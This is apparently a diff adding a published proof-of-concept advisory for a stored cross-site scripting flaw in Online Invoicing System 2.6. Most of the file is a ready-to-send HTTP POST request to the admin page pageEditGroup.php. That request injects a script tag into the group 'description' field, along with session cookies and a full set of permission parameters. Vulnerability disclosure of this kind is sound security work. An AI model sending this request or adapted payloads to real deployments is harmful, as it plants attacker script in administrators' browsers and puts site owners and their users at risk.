@@ -1,0 +1,30 @@
+# Exploit Title: Online Invoicing System 2.6 - 'description' Persistent Cross-Site Scripting
+# Date: 2019-11-29
+# Exploit Author: Cemal Cihad ÇİFTÇİ
+# Vendor Homepage: https://bigprof.com
+# Software Download Link : https://github.com/bigprof-software/online-invoicing-system
+# Software : Online Invoicing System
+# Version : 2.6
+# Vulernability Type : Cross-site Scripting
+# Vulenrability : Stored XSS
+
+# Stored XSS has been discovered in the Online Invoicing System created by bigprof/AppGini
+# editmembers section. Description parameter affected from this vulnerability.
+# payload: <script>alert(123);</script>
+
+# HTTP POST request
+POST /inovicing/app/admin/pageEditGroup.php HTTP/1.1
+Host: 10.10.10.160
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 464
+Origin: http://10.10.10.160
+Connection: close
+Referer: http://10.10.10.160/inovicing/app/admin/pageEditGroup.php?groupID=2
+Cookie: inventory=4eg101l42apiuvutr7vguma5ar; online_inovicing_system=vl8ml5or8sgdee9ep9lnhglk69
+Upgrade-Insecure-Requests: 1
+
+groupID=2&name=Admins&description=%3Cscript%3Ealert%28123%29%3B%3C%2Fscript%3E&visitorSignup=0&invoices_insert=1&invoices_view=3&invoices_edit=3&invoices_delete=3&clients_insert=1&clients_view=3&clients_edit=3&clients_delete=3&item_prices_insert=1&item_prices_view=3&item_prices_edit=3&item_prices_delete=3&invoice_items_insert=1&invoice_items_view=3&invoice_items_edit=3&invoice_items_delete=3&items_insert=1&items_view=3&items_edit=3&items_delete=3&saveChanges=1
